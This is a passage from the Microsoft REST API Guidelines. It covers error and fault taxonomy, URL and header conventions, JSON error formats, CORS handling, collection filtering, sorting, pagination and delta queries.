with the other APIs of the same version. So if a service was written against version 1.0 of the guidelines, new APIs added incrementally to the service SHOULD also follow version 1.0. The service can then upgrade to align with the latest version of the guidelines at the service's next major release. 4.3 Requirements language The keywords \"MUST,\" \"MUST NOT,\" \"REQUIRED,\" \"SHALL,\" \"SHALL NOT,\" \"SHOULD,\" \"SHOULD NOT,\" \"RECOMMENDED,\" \"MAY,\" and \"OPTIONAL\" in this document are to be interpreted as described in RFC 2119. 4.4 License This work is licensed under the Creative Commons Attribution 4.0 International License. To view a copy of this license, visit http://creativecommons.org/licenses/by/4.0/ or send a letter to Creative Commons, PO Box 1866, Mountain View, CA 94042, USA. 5 Taxonomy As part of onboarding to Microsoft REST API Guidelines, services MUST comply with the taxonomy defined below. 5.1 Errors Errors, or more specifically Service Errors, are defined as a client passing invalid data to the service and the service correctly rejecting that data. Examples include invalid credentials, incorrect parameters, unknown version IDs, or similar. These are generally \"4xx\" HTTP error codes and are the result of a client passing incorrect or invalid data. Errors do not contribute to overall API availability. 5.2 Faults Faults, or more specifically Service Faults, are defined as the service failing to correctly return in response to a valid client request. These are generally \"5xx\" HTTP error codes. Faults do contribute to the overall API availability. Calls that fail due to rate limiting or quota failures MUST NOT count as faults. Calls that fail as the result of a service fast-failing requests (often for its own protection) do count as faults. 5.3 Latency Latency is defined as how long a particular API call takes to complete, measured as closely to the client as possible. This metric applies to both synchronous and asynchronous APIs in the same way. For long running calls, the latency is measured on the initial request and measures how long that call (not the overall operation) takes to complete. 5.4 Time to complete Services that expose long operations MUST track \"Time to Complete\" metrics around those operations. 5.5 Long running API faults For a Long Running API, it's possible for both the initial request to begin the operation and the request to retrieve the results to technically work (each passing back a 200), but for the underlying operation to have failed. Long Running faults MUST roll up as Faults into the overall Availability metrics. 6 Client guidance To ensure the best possible experience for clients talking to a REST service, clients SHOULD adhere to the following best practices: 6.1 Ignore rule For loosely coupled clients where the exact shape of the data is not known before the call, if the server returns something the client wasn't expecting, the client MUST safely ignore it. Some services MAY add fields to responses without changing versions numbers. Services that do so MUST make this clear in their documentation and clients MUST ignore unknown fields. 6.2 Variable order rule Clients MUST NOT rely on the order in which data appears in JSON service responses. For example, clients SHOULD be resilient to the reordering of fields within a JSON object. When supported by the service, clients MAY request that data be returned in a specific order. For example, services MAY support the use of the $orderBy querystring parameter to specify the order of elements within a JSON array. Services MAY also explicitly specify the ordering of some elements as part of the service contract. For example, a service MAY always return a JSON object's \"type\" information as the first field in an object to simplify response parsing on the client. Clients MAY rely on ordering behavior explicitly identified by the service. 6.3 Silent fail rule Clients requesting OPTIONAL server functionality (such as optional headers) MUST be resilient to the server ignoring that particular functionality. 7 Consistency fundamentals 7.1 URL structure Humans SHOULD be able to easily read and construct URLs. This facilitates discovery and eases adoption on platforms without a well-supported client library. An example of a well-structured URL is: https://api.contoso.com/v1.0/people/jdoe@contoso.com/inbox An example URL that is not friendly is: https://api.contoso.com/EWS/OData/Users('jdoe@microsoft.com')/Folders('AAMkADdiYzI1MjUzLTk4MjQtNDQ1Yy05YjJkLWNlMzMzYmIzNTY0MwAuAAAAAACzMsPHYH6HQoSwfdpDx-2bAQCXhUk6PC1dS7AERFluCgBfAAABo58UAAA=') A frequent pattern that comes up is the use of URLs as values. Services MAY use URLs as values. For example, the following is acceptable: https://api.contoso.com/v1.0/items?url=https://resources.contoso.com/shoes/fancy 7.2 URL length The HTTP 1.1 message format, defined in RFC 7230, in section 3.1.1, defines no length limit on the Request Line, which includes the target URL. From the RFC: HTTP does not place a predefined limit on the length of a request-line. [...] A server that receives a request-target longer than any URI it wishes to parse MUST respond with a 414 (URI Too Long) status code. Services that can generate URLs longer than 2,083 characters MUST make accommodations for the clients they wish to support. Here are some sources for determining what target clients support: http://stackoverflow.com/a/417184 https://blogs.msdn.microsoft.com/ieinternals/2014/08/13/url-length-limits/ Also note that some technology stacks have hard and adjustable url limits, so keep this in mind as you design your services. 7.3 Canonical identifier In addition to friendly URLs, resources that can be moved or be renamed SHOULD expose a URL that contains a unique stable identifier. It MAY be necessary to interact with the service to obtain a stable URL from the friendly name for the resource, as in the case of the \"/my\" shortcut used by some services. The stable identifier is not required to be a GUID. An example of a URL containing a canonical identifier is: https://api.contoso.com/v1.0/people/7011042402/inbox 7.4 Supported methods Operations MUST use the proper HTTP methods whenever possible, and operation idempotency MUST be respected. HTTP methods are frequently referred to as the HTTP verbs. The terms are synonymous in this context, however the HTTP specification uses the term method. Below is a list of methods that Microsoft REST services SHOULD support. Not all resources will support all methods, but all resources using the methods below MUST conform to their usage. Method Description Is Idempotent GET Return the current value of an object True PUT Replace an object, or create a named object, when applicable True DELETE Delete an object True POST Create a new object based on the data provided, or submit a command False HEAD Return metadata of an object for a GET response. Resources that support the GET method MAY support the HEAD method as well True PATCH Apply a partial update to an object False OPTIONS Get information about a request; see below for details. True Table 1 7.4.1 POST POST operations SHOULD support the Location response header to specify the location of any created resource that was not explicitly named, via the Location header. As an example, imagine a service that allows creation of hosted servers, which will be named by the service: POST http://api.contoso.com/account1/servers The response would be something like: 201 Created Location: http://api.contoso.com/account1/servers/server321 Where \"server321\" is the service-allocated server name. Services MAY also return the full metadata for the created item in the response. 7.4.2 PATCH PATCH has been standardized by IETF as the method to be used for updating an existing object incrementally (see RFC 5789). Microsoft REST API Guidelines compliant APIs SHOULD support PATCH. 7.4.3 Creating resources via PATCH (UPSERT semantics) Services that allow callers to specify key values on create SHOULD support UPSERT semantics, and those that do MUST support creating resources using PATCH. Because PUT is defined as a complete replacement of the content, it is dangerous for clients to use PUT to modify data. Clients that do not understand (and hence ignore) properties on a resource are not likely to provide them on a PUT when trying to update a resource, hence such properties could be inadvertently removed. Services MAY optionally support PUT to update existing resources, but if they do they MUST use replacement semantics (that is, after the PUT, the resource's properties MUST match what was provided in the request, including deleting any server properties that were not provided). Under UPSERT semantics, a PATCH call to a nonexistent resource is handled by the server as a \"create,\" and a PATCH call to an existing resource is handled as an \"update.\" To ensure that an update request is not treated as a create or vice-versa, the client MAY specify precondition HTTP headers in the request. The service MUST NOT treat a PATCH request as an insert if it contains an If-Match header and MUST NOT treat a PATCH request as an update if it contains an If-None-Match header with a value of \"*\". If a service does not support UPSERT, then a PATCH call against a resource that does not exist MUST result in an HTTP \"409 Conflict\" error. 7.4.4 Options and link headers OPTIONS allows a client to retrieve information about a resource, at a minimum by returning the Allow header denoting the valid methods for this resource. In addition, services SHOULD include a Link header (see RFC 5988) to point to documentation for the resource in question: Link: <{help}>; rel=\"help\" Where {help} is the URL to a documentation resource. For examples on use of OPTIONS, see preflighting CORS cross-domain calls. 7.5 Standard request headers The table of request headers below SHOULD be used by Microsoft REST API Guidelines services. Using these headers is not mandated, but if used they MUST be used consistently. All header values MUST follow the syntax rules set forth in the specification where the header field is defined. Many HTTP headers are defined in RFC7231, however a complete list of approved headers can be found in the IANA Header Registry.\" Header Type Description Authorization String Authorization header for the request Date Date Timestamp of the request, based on the client's clock, in RFC 5322 date and time format. The server SHOULD NOT make any assumptions about the accuracy of the client's clock. This header MAY be included in the request, but MUST be in this format when supplied. Greenwich Mean Time (GMT) MUST be used as the time zone reference for this header when it is provided. For example: Wed, 24 Aug 2016 18:41:30 GMT. Note that GMT is exactly equal to UTC (Coordinated Universal Time) for this purpose. Accept Content type The requested content type for the response such as: application/xmltext/xmlapplication/jsontext/javascript (for JSONP)Per the HTTP guidelines, this is just a hint and responses MAY have a different content type, such as a blob fetch where a successful response will just be the blob stream as the payload. For services following OData, the preference order specified in OData SHOULD be followed. Accept-Encoding Gzip, deflate REST endpoints SHOULD support GZIP and DEFLATE encoding, when applicable. For very large resources, services MAY ignore and return uncompressed data. Accept-Language \"en\", \"es\", etc. Specifies the preferred language for the response. Services are not required to support this, but if a service supports localization it MUST do so through the Accept-Language header. Accept-Charset Charset type like \"UTF-8\" Default is UTF-8, but services SHOULD be able to handle ISO-8859-1. Content-Type Content type Mime type of request body (PUT/POST/PATCH) Prefer return=minimal, return=representation If the return=minimal preference is specified, services SHOULD return an empty body in response to a successful insert or update. If return=representation is specified, services SHOULD return the created or updated resource in the response. Services SHOULD support this header if they have scenarios where clients would sometimes benefit from responses, but sometimes the response would impose too much of a hit on bandwidth. If-Match, If-None-Match, If-Range String Services that support updates to resources using optimistic concurrency control MUST support the If-Match header to do so. Services MAY also use other headers related to ETags as long as they follow the HTTP specification. 7.6 Standard response headers Services SHOULD return the following response headers, except where noted in the \"required\" column. Response Header Required Description Date All responses Timestamp the response was processed, based on the server's clock, in RFC 5322 date and time format. This header MUST be included in the response. Greenwich Mean Time (GMT) MUST be used as the time zone reference for this header. For example: Wed, 24 Aug 2016 18:41:30 GMT. Note that GMT is exactly equal to UTC (Coordinated Universal Time) for this purpose. Content-Type All responses The content type Content-Encoding All responses GZIP or DEFLATE, as appropriate Preference-Applied When specified in request Whether a preference indicated in the Prefer request header was applied ETag When the requested resource has an entity tag The ETag response-header field provides the current value of the entity tag for the requested variant. Used with If-Match, If-None-Match and If-Range to implement optimistic concurrency control. 7.7 Custom headers Custom headers MUST NOT be required for the basic operation of a given API. Some of the guidelines in this document prescribe the use of nonstandard HTTP headers. In addition, some services MAY need to add extra functionality, which is exposed via HTTP headers. The following guidelines help maintain consistency across usage of custom headers. Headers that are not standard HTTP headers MUST have one of two formats: A generic format for headers that are registered as \"provisional\" with IANA (RFC 3864) A scoped format for headers that are too usage-specific for registration These two formats are described below. 7.8 Specifying headers as query parameters Some headers pose challenges for some scenarios such as AJAX clients, especially when making cross-domain calls where adding headers MAY not be supported. As such, some headers MAY be accepted as Query Parameters in addition to headers, with the same naming as the header: Not all headers make sense as query parameters, including most standard HTTP headers. The criteria for considering when to accept headers as parameters are: Any custom headers MUST be also accepted as parameters. Required standard headers MAY be accepted as parameters. Required headers with security sensitivity (e.g., Authorization header) MIGHT NOT be appropriate as parameters; the service owner SHOULD evaluate these on a case-by-case basis. The one exception to this rule is the Accept header. It's common practice to use a scheme with simple names instead of the full functionality described in the HTTP specification for Accept. 7.9 PII parameters Consistent with their organization's privacy policy, clients SHOULD NOT transmit personally identifiable information (PII) parameters in the URL (as part of path or query string) because this information can be inadvertently exposed via client, network, and server logs and other mechanisms. Consequently, a service SHOULD accept PII parameters transmitted as headers. However, there are many scenarios where the above recommendations cannot be followed due to client or software limitations. To address these limitations, services SHOULD also accept these PII parameters as part of the URL consistent with the rest of these guidelines. Services that accept PII parameters -- whether in the URL or as headers -- SHOULD be compliant with privacy policy specified by their organization's engineering leadership. This will typically include recommending that clients prefer headers for transmission and implementations adhere to special precautions to ensure that logs and other service data collection are properly handled. 7.10 Response formats For organizations to have a successful platform, they must serve data in formats developers are accustomed to using, and in consistent ways that allow developers to handle responses with common code. Web-based communication, especially when a mobile or other low-bandwidth client is involved, has moved quickly in the direction of JSON for a variety of reasons, including its tendency to be lighter weight and its ease of consumption with JavaScript-based clients. JSON property names SHOULD be camelCased. Services SHOULD provide JSON as the default encoding. 7.10.1 Clients-specified response format In HTTP, response format SHOULD be requested by the client using the Accept header. This is a hint, and the server MAY ignore it if it chooses to, even if this isn't typical of well-behaved servers. Clients MAY send multiple Accept headers and the service MAY choose one of them. The default response format (no Accept header provided) SHOULD be application/json, and all services MUST support application/json. Accept Header Response type Notes application/json Payload SHOULD be returned as JSON Also accept text/javascript for JSONP cases GET https://api.contoso.com/v1.0/products/user Accept: application/json 7.10.2 Error condition responses For nonsuccess conditions, developers SHOULD be able to write one piece of code that handles errors consistently across different Microsoft REST API Guidelines services. This allows building of simple and reliable infrastructure to handle exceptions as a separate flow from successful responses. The following is based on the OData v4 JSON spec. However, it is very generic and does not require specific OData constructs. APIs SHOULD use this format even if they are not using other OData constructs. The error response MUST be a single JSON object. This object MUST have a name/value pair named \"error.\" The value MUST be a JSON object. This object MUST contain name/value pairs with the names \"code\" and \"message,\" and it MAY contain name/value pairs with the names \"target,\" \"details\" and \"innererror.\" The value for the \"code\" name/value pair is a language-independent string. Its value is a service-defined error code that SHOULD be human-readable. This code serves as a more specific indicator of the error than the HTTP error code specified in the response. Services SHOULD have a relatively small number (about 20) of possible values for \"code,\" and all clients MUST be capable of handling all of them. Most services will require a much larger number of more specific error codes, which are not interesting to all clients. These error codes SHOULD be exposed in the \"innererror\" name/value pair as described below. Introducing a new value for \"code\" that is visible to existing clients is a breaking change and requires a version increase. Services can avoid breaking changes by adding new error codes to \"innererror\" instead. The value for the \"message\" name/value pair MUST be a human-readable representation of the error. It is intended as an aid to developers and is not suitable for exposure to end users. Services wanting to expose a suitable message for end users MUST do so through an annotation or custom property. Services SHOULD NOT localize \"message\" for the end user, because doing so MAY make the value unreadable to the app developer who may be logging the value, as well as make the value less searchable on the Internet. The value for the \"target\" name/value pair is the target of the particular error (e.g., the name of the property in error). The value for the \"details\" name/value pair MUST be an array of JSON objects that MUST contain name/value pairs for \"code\" and \"message,\" and MAY contain a name/value pair for \"target,\" as described above. The objects in the \"details\" array usually represent distinct, related errors that occurred during the request. See example below. The value for the \"innererror\" name/value pair MUST be an object. The contents of this object are service-defined. Services wanting to return more specific errors than the root-level code MUST do so by including a name/value pair for \"code\" and a nested \"innererror.\" Each nested \"innererror\" object represents a higher level of detail than its parent. When evaluating errors, clients MUST traverse through all of the nested \"innererrors\" and choose the deepest one that they understand. This scheme allows services to introduce new error codes anywhere in the hierarchy without breaking backwards compatibility, so long as old error codes still appear. The service MAY return different levels of depth and detail to different callers. For example, in development environments, the deepest \"innererror\" MAY contain internal information that can help debug the service. To guard against potential security concerns around information disclosure, services SHOULD take care not to expose too much detail unintentionally. Error objects MAY also include custom server-defined name/value pairs that MAY be specific to the code. Error types with custom server-defined properties SHOULD be declared in the service's metadata document. See example below. Error responses MAY contain annotations in any of their JSON objects. We recommend that for any transient errors that may be retried, services SHOULD include a Retry-After HTTP header indicating the minimum number of seconds that clients SHOULD wait before attempting the operation again. ErrorResponse : Object Property Type Required Description error Error The error object. Error : Object Property Type Required Description code String (enumerated) One of a server-defined set of error codes. message String A human-readable representation of the error. target String The target of the error. details Error[] An array of details about specific errors that led to this reported error. innererror InnerError An object containing more specific information than the current object about the error. InnerError : Object Property Type Required Description code String A more specific error code than was provided by the containing error. innererror InnerError An object containing more specific information than the current object about the error. Examples Example of \"innererror\": { \"error\": { \"code\": \"BadArgument\", \"message\": \"Previous passwords may not be reused\", \"target\": \"password\", \"innererror\": { \"code\": \"PasswordError\", \"innererror\": { \"code\": \"PasswordDoesNotMeetPolicy\", \"minLength\": \"6\", \"maxLength\": \"64\", \"characterTypes\": [\"lowerCase\",\"upperCase\",\"number\",\"symbol\"], \"minDistinctCharacterTypes\": \"2\", \"innererror\": { \"code\": \"PasswordReuseNotAllowed\" } } } } } In this example, the most basic error code is \"BadArgument,\" but for clients that are interested, there are more specific error codes in \"innererror.\" The \"PasswordReuseNotAllowed\" code may have been added by the service at a later date, having previously only returned \"PasswordDoesNotMeetPolicy.\" Existing clients do not break when the new error code is added, but new clients MAY take advantage of it. The \"PasswordDoesNotMeetPolicy\" error also includes additional name/value pairs that allow the client to determine the server's configuration, validate the user's input programmatically, or present the server's constraints to the user within the client's own localized messaging. Example of \"details\": { \"error\": { \"code\": \"BadArgument\", \"message\": \"Multiple errors in ContactInfo data\", \"target\": \"ContactInfo\", \"details\": [ { \"code\": \"NullValue\", \"target\": \"PhoneNumber\", \"message\": \"Phone number must not be null\" }, { \"code\": \"NullValue\", \"target\": \"LastName\", \"message\": \"Last name must not be null\" }, { \"code\": \"MalformedValue\", \"target\": \"Address\", \"message\": \"Address is not valid\" } ] } } In this example there were multiple problems with the request, with each individual error listed in \"details.\" 7.11 HTTP Status Codes Standard HTTP Status Codes SHOULD be used; see the HTTP Status Code definitions for more information. 7.12 Client library optional Developers MUST be able to develop on a wide variety of platforms and languages, such as Windows, MacOS, Linux, C#, Python, Node.js, and Ruby. Services SHOULD be able to be accessed from simple HTTP tools such as curl without significant effort. Service developer portals SHOULD provide the equivalent of \"Get Developer Token\" to facilitate experimentation and curl support. 8 CORS Services compliant with the Microsoft REST API Guidelines MUST support CORS (Cross Origin Resource Sharing). Services SHOULD support an allowed origin of CORS * and enforce authorization through valid OAuth tokens. Services SHOULD NOT support user credentials with origin validation. There MAY be exceptions for special cases. 8.1 Client guidance Web developers usually don't need to do anything special to take advantage of CORS. All of the handshake steps happen invisibly as part of the standard XMLHttpRequest calls they make. Many other platforms, such as .NET, have integrated support for CORS. 8.1.1 Avoiding preflight Because the CORS protocol can trigger preflight requests that add additional round trips to the server, performance-critical apps might be interested in avoiding them. The spirit behind CORS is to avoid preflight for any simple cross-domain requests that old non-CORS-capable browsers were able to make. All other requests require preflight. A request is \"simple\" and avoids preflight if its method is GET, HEAD or POST, and if it doesn't contain any request headers besides Accept, Accept-Language and Content-Language. For POST requests, the Content-Type header is also allowed, but only if its value is \"application/x-www-form-urlencoded,\" \"multipart/form-data\" or \"text/plain.\" For any other headers or values, a preflight request will happen. 8.2 Service guidance At minimum, services MUST: Understand the Origin request header that browsers send on cross-domain requests, and the Access-Control-Request-Method request header that they send on preflight OPTIONS requests that check for access. If the Origin header is present in a request: If the request uses the OPTIONS method and contains the Access-Control-Request-Method header, then it is a preflight request intended to probe for access before the actual request. Otherwise, it is an actual request. For preflight requests, beyond performing the steps below to add headers, services MUST perform no additional processing and MUST return a 200 OK. For non-preflight requests, the headers below are added in addition to the request's regular processing. Add an Access-Control-Allow-Origin header to the response, containing the same value as the Origin request header. Note that this requires services to dynamically generate the header value. Resources that do not require cookies or any other form of user credentials MAY respond with a wildcard asterisk (*) instead. Note that the wildcard is acceptable here only, and not for any of the other headers described below. If the caller requires access to a response header that is not in the set of simple response headers (Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma), then add an Access-Control-Expose-Headers header containing the list of additional response header names the client should have access to. If the request requires cookies, then add an Access-Control-Allow-Credentials header set to \"true.\" If the request was a preflight request (see first bullet), then the service MUST: Add an Access-Control-Allow-Headers response header containing the list of request header names the client is permitted to use. This list need only contain headers that are not in the set of simple request headers (Accept, Accept-Language, Content-Language). If there are no restrictions on headers the service accepts, the service MAY simply return the same value as the Access-Control-Request-Headers header sent by the client. Add an Access-Control-Allow-Methods response header containing the list of HTTP methods the caller is permitted to use. Add an Access-Control-Max-Age pref response header containing the number of seconds for which this preflight response is valid (and hence can be avoided before subsequent actual requests). Note that while it is customary to use a large value like 2592000 (30 days), many browsers self-impose a much lower limit (e.g., five minutes). Because browser preflight response caches are notoriously weak, the additional round trip from a preflight response hurts performance. Services used by interactive Web clients where performance is critical SHOULD avoid patterns that cause a preflight request For GET and HEAD calls, avoid requiring request headers that are not part of the simple set above. Allow them to be provided as query parameters instead. The Authorization header is not part of the simple set, so the authentication token MUST be sent through the \"access_token\" query parameter instead, for resources requiring authentication. Note that passing authentication tokens in the URL is not recommended, because it can lead to the token getting recorded in server logs and exposed to anyone with access to those logs. Services that accept authentication tokens through the URL MUST take steps to mitigate the security risks, such as using short-lived authentication tokens, suppressing the auth token from getting logged, and controlling access to server logs. Avoid requiring cookies. XmlHttpRequest will only send cookies on cross-domain requests if the \"withCredentials\" attribute is set; this also causes a preflight request. Services that require cookie-based authentication MUST use a \"dynamic canary\" to secure all APIs that accept cookies. For POST calls, prefer simple Content-Types in the set of (\"application/x-www-form-urlencoded,\" \"multipart/form-data,\" \"text/plain\") where applicable. Any other Content-Type will induce a preflight request. Services MUST NOT contravene other API recommendations in the name of avoiding CORS preflight requests. In particular, in accordance with recommendations, most POST requests will actually require a preflight request due to the Content-Type. If eliminating preflight is critical, then a service MAY support alternative mechanisms for data transfer, but the RECOMMENDED approach MUST also be supported. In addition, when appropriate services MAY support the JSONP pattern for simple, GET-only cross-domain access. In JSONP, services take a parameter indicating the format ($format=json) and a parameter indicating a callback ($callback=someFunc), and return a text/javascript document containing the JSON response wrapped in a function call with the indicated name. More on JSONP at Wikipedia: JSONP. 9 Collections 9.1 Item keys Services MAY support durable identifiers for each item in the collection, and that identifier SHOULD be represented in JSON as \"id\". These durable identifiers are often used as item keys. Collections that support durable identifiers MAY support delta queries. 9.2 Serialization Collections are represented in JSON using standard array notation. 9.3 Collection URL patterns Collections are located directly under the service root when they are top level, or as a segment under another resource when scoped to that resource. For example: GET https://api.contoso.com/v1.0/people Whenever possible, services MUST support the \"/\" pattern. For example: GET https://{serviceRoot}/{collection}/{id} Where: {serviceRoot} the combination of host (site URL) + the root path to the service {collection} the name of the collection, unabbreviated, pluralized {id} the value of the unique id property. When using the \"/\" pattern this MUST be the raw string/number/guid value with no quoting but properly escaped to fit in a URL segment. 9.3.1 Nested collections and properties Collection items MAY contain other collections. For example, a user collection MAY contain user resources that have multiple addresses: GET https://api.contoso.com/v1.0/people/123/addresses { \"value\": [ { \"street\": \"1st Avenue\", \"city\": \"Seattle\" }, { \"street\": \"124th Ave NE\", \"city\": \"Redmond\" } ] } 9.4 Big collections As data grows, so do collections. Planning for pagination is important for all services. Therefore, when multiple pages are available, the serialization payload MUST contain the opaque URL for the next page as appropriate. Refer to the paging guidance for more details. Clients MUST be resilient to collection data being either paged or nonpaged for any given request. { \"value\":[ { \"id\": \"Item 1\",\"price\": 99.95,\"sizes\": null}, { }, { }, { \"id\": \"Item 99\",\"price\": 59.99,\"sizes\": null} ], \"@nextLink\": \"{opaqueUrl}\" } 9.5 Changing collections POST requests are not idempotent. This means that two POST requests sent to a collection resource with exactly the same payload MAY lead to multiple items being created in that collection. This is often the case for insert operations on items with a server-side generated id. For example, the following request: POST https://api.contoso.com/v1.0/people Would lead to a response indicating the location of the new collection item: 201 Created Location: https://api.contoso.com/v1.0/people/123 And once executed again, would likely lead to another resource: 201 Created Location: https://api.contoso.com/v1.0/people/124 While a PUT request would require the indication of the collection item with the corresponding key instead: PUT https://api.contoso.com/v1.0/people/123 9.6 Sorting collections The results of a collection query MAY be sorted based on property values. The property is determined by the value of the $orderBy query parameter. The value of the $orderBy parameter contains a comma-separated list of expressions used to sort the items. A special case of such an expression is a property path terminating on a primitive property. The expression MAY include the suffix \"asc\" for ascending or \"desc\" for descending, separated from the property name by one or more spaces. If \"asc\" or \"desc\" is not specified, the service MUST order by the specified property in ascending order. NULL values MUST sort as \"less than\" non-NULL values. Items MUST be sorted by the result values of the first expression, and then items with the same value for the first expression are sorted by the result value of the second expression, and so on. The sort order is the inherent order for the type of the property. For example: GET https://api.contoso.com/v1.0/people?$orderBy=name Will return all people sorted by name in ascending order. For example: GET https://api.contoso.com/v1.0/people?$orderBy=name desc Will return all people sorted by name in descending order. Sub-sorts can be specified by a comma-separated list of property names with OPTIONAL direction qualifier. For example: GET https://api.contoso.com/v1.0/people?$orderBy=name desc,hireDate Will return all people sorted by name in descending order and a secondary sort order of hireDate in ascending order. Sorting MUST compose with filtering such that: GET https://api.contoso.com/v1.0/people?$filter=name eq 'david'&$orderBy=hireDate Will return all people whose name is David sorted in ascending order by hireDate. 9.6.1 Interpreting a sorting expression Sorting parameters MUST be consistent across pages, as both client and server-side paging is fully compatible with sorting. If a service does not support sorting by a property named in a $orderBy expression, the service MUST respond with an error message as defined in the Responding to Unsupported Requests section. 9.7 Filtering The $filter querystring parameter allows clients to filter a collection of resources that are addressed by a request URL. The expression specified with $filter is evaluated for each resource in the collection, and only items where the expression evaluates to true are included in the response. Resources for which the expression evaluates to false or to null, or which reference properties that are unavailable due to permissions, are omitted from the response. Example: return all Products whose Price is less than $10.00 GET https://api.contoso.com/v1.0/products?$filter=price lt 10.00 The value of the $filter option is a Boolean expression. 9.7.1 Filter operations Services that support $filter SHOULD support the following minimal set of operations. Operator Description Example Comparison Operators eq Equal city eq 'Redmond' ne Not equal city ne 'London' gt Greater than price gt 20 ge Greater than or equal price ge 10 lt Less than price lt 20 le Less than or equal price le 100 Logical Operators and Logical and price le 200 and price gt 3.5 or Logical or price le 3.5 or price gt 200 not Logical negation not price le 3.5 Grouping Operators ( ) Precedence grouping (priority eq 1 or city eq 'Redmond') and price gt 100 9.7.2 Operator examples The following examples illustrate the use and semantics of each of the logical operators. Example: all products with a name equal to 'Milk' GET https://api.contoso.com/v1.0/products?$filter=name eq 'Milk' Example: all products with a name not equal to 'Milk' GET https://api.contoso.com/v1.0/products?$filter=name ne 'Milk' Example: all products with the name 'Milk' that also have a price less than 2.55: GET https://api.contoso.com/v1.0/products?$filter=name eq 'Milk' and price lt 2.55 Example: all products that either have the name 'Milk' or have a price less than 2.55: GET https://api.contoso.com/v1.0/products?$filter=name eq 'Milk' or price lt 2.55 Example 54: all products that have the name 'Milk' or 'Eggs' and have a price less than 2.55: GET https://api.contoso.com/v1.0/products?$filter=(name eq 'Milk' or name eq 'Eggs') and price lt 2.55 9.7.3 Operator precedence Services MUST use the following operator precedence for supported operators when evaluating $filter expressions. Operators are listed by category in order of precedence from highest to lowest. Operators in the same category have equal precedence: Group Operator Description Grouping ( ) Precedence grouping Unary not Logical Negation Relational gt Greater Than | ge | Greater than or Equal | lt | Less Than | le | Less than or Equal Equality | eq | Equal | ne | Not Equal Conditional AND | and | Logical And Conditional OR | or | Logical Or 9.8 Pagination RESTful APIs that return collections MAY return partial sets. Consumers of these services MUST expect partial result sets and correctly page through to retrieve an entire set. There are two forms of pagination that MAY be supported by RESTful APIs. Server-driven paging mitigates against denial-of-service attacks by forcibly paginating a request over multiple response payloads. Client-driven paging enables clients to request only the number of resources that it can use at a given time. Sorting and Filtering parameters MUST be consistent across pages, because both client- and server-side paging is fully compatible with both filtering and sorting. 9.8.1 Server-driven paging Paginated responses MUST indicate a partial result by including a continuation token in the response. The absence of a continuation token means that no additional pages are available. Clients MUST treat the continuation URL as opaque, which means that query options may not be changed while iterating over a set of partial results. Example: GET http://api.contoso.com/v1.0/people HTTP/1.1 Accept: application/json HTTP/1.1 200 OK Content-Type: application/json { ..., \"value\": [...], \"@nextLink\": \"{opaqueUrl}\" } 9.8.2 Client-driven paging Clients MAY use $top and $skip query parameters to specify a number of results to return and an offset. The server SHOULD honor the values specified by the client; however, clients MUST be prepared to handle responses that contain a different page size or contain a continuation token. Note: If the server can't honor $top and/or $skip, the server MUST return an error to the client informing about it instead of just ignoring the query options. This will avoid the risk of the client making assumptions about the data returned. Example: GET http://api.contoso.com/v1.0/people?$top=5&$skip=2 HTTP/1.1 Accept: application/json HTTP/1.1 200 OK Content-Type: application/json { ..., \"value\": [...] } 9.8.3 Additional considerations Stable order prerequisite: Both forms of paging depend on the collection of items having a stable order. The server MUST supplement any specified order criteria with additional sorts (typically by key) to ensure that items are always ordered consistently. Missing/repeated results: Even if the server enforces a consistent sort order, results MAY be missing or repeated based on creation or deletion of other resources. Clients MUST be prepared to deal with these discrepancies. The server SHOULD always encode the record ID of the last read record, helping the client in the process of managing repeated/missing results. Combining client- and server-driven paging: Note that client-driven paging does not preclude server-driven paging. If the page size requested by the client is larger than the default page size supported by the server, the expected response would be the number of results specified by the client, paginated as specified by the server paging settings. Page Size: Clients MAY request server-driven paging with a specific page size by specifying a $maxpagesize preference. The server SHOULD honor this preference if the specified page size is smaller than the server's default page size. Paginating embedded collections: It is possible for both client-driven paging and server-driven paging to be applied to embedded collections. If a server paginates an embedded collection, it MUST include additional continuation tokens as appropriate. Recordset count: Developers who want to know the full number of records across all pages, MAY include the query parameter $count=true to tell the server to include the count of items in the response. 9.9 Compound collection operations Filtering, Sorting and Pagination operations MAY all be performed against a given collection. When these operations are performed together, the evaluation order MUST be: Filtering. This includes all range expressions performed as an AND operation. Sorting. The potentially filtered list is sorted according to the sort criteria. Pagination. The materialized paginated view is presented over the filtered, sorted list. This applies to both server-driven pagination and client-driven pagination. 10 Delta queries Services MAY choose to support delta queries. 10.1 Delta links Delta links are opaque, service-generated links that the client uses to retrieve subsequent changes to a result. At a conceptual level delta links are based on a defining query that describes the set of results for which changes are being tracked. The delta link encodes the collection of entities for which changes are being tracked, along with a starting point from which to track changes. If the query contains a filter, the response MUST include only changes to entities matching the specified criteria. The key principles of the Delta Query are: Every item in the set MUST have a persistent identifier. That identifier SHOULD be represented as \"id\". This identifier is a service defined opaque string that MAY be used by the client to track object across calls. The delta MUST contain an entry for each entity that newly matches the specified criteria, and MUST contain a \"@removed\" entry for each entity that no longer matches the criteria. Re-evaluate the query and compare it to original set of results; every entry uniquely in the current set MUST be returned as an Add operation, and every entry uniquely in the original set MUST be returned as a \"remove\" operation. Each entity that previously did not match the criteria but matches it now MUST be returned as an \"add\"; conversely, each entity that previously matched the query but no longer does MUST be returned as a \"@removed\" entry. Entities that have changed MUST be included in the set using their standard representation. Services MAY add additional metadata to the \"@removed\" node, such as a reason for removal, or a \"removed at\" timestamp. We recommend teams coordinate with the Microsoft REST API Guidelines Working Group on extensions to help maintain consistency. The delta link MUST NOT encode any client top or skip value. 10.2 Entity representation Added and updated entities are represented in the entity set using their standard representation. From the perspective of the set, there is no difference between an added or updated entity. Removed entities are represented using only their \"id\" and an \"@removed\" node. The presence of an \"@removed\" node MUST represent the removal of the entry from the set. 10.3 Obtaining a delta link A delta link is obtained by querying a collection or entity and appending a $delta query string parameter. For example: GET https://api.contoso.com/v1.0/people?$delta HTTP/1.1 Accept: application/json HTTP/1.1 200 OK Content-Type: application/json { \"value\":[ { \"id\": \"1\", \"name\": \"Matt\"}, { \"id\": \"2\", \"name\": \"Mark\"}, { \"id\": \"3\", \"name\": \"John\"}, ], \"@deltaLink\": \"{opaqueUrl}\" } Note: If the collection is paginated the deltaLink will only be present on the final page but MUST reflect any changes to the data returned across all pages. 10.4 Contents of a delta link response Added/Updated entries MUST appear as regular JSON objects, with regular item properties. Returning the added/modified items in their regular representation allows the client to merge them into their existing \"cache\" using standard merge concepts based on the \"id\" field. Entries removed from the defined collection MUST be included in the response. Items removed from the set MUST be represented using only their \"id\" and an \"@removed\" node. 10.5 Using a delta link The client requests changes by 